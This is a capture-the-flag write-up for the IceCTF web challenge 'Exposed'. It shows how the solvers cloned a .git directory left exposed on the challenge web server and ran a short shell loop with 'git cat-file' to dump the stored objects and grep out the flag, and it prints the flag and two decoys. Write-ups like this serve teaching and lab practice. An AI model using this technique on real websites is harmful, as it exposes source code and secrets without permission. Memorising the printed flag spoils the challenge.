## Exposed, web, 60 points

__Description__:

John is pretty happy with himself, he just made his first website! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag?


__Solver__: [int10h](https://github.com/brianmwaters) & [mut3](https://github.com/mut3)

This challenge was based on digging back through the git history. The repository was on the server so it could be cloned by doing.

```
git clone http://exposed.vuln.icec.tf/.git
```

We did a lot of manual digging around and reconstructing the repository from git objects ripped off the server, only to realized we could use the `git cat-file` command on the git objects and wrote this script.

```
#!/bin/sh

#git cloned this first
cd exposed.vuln.icec.tf
cd .git/objects
for i in */*; do f=$(echo $i | sed 's/\///'); git cat-file -p $f ; done | grep IceCTF
```

`git cat-file` renders the git object binaries as the versions of the files they represent this script output the flag along with a few decoys.

```
echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
                    echo 'IceCTF{not_this_flag}';
IceCTF{this_isnt_the_flag_either}
```
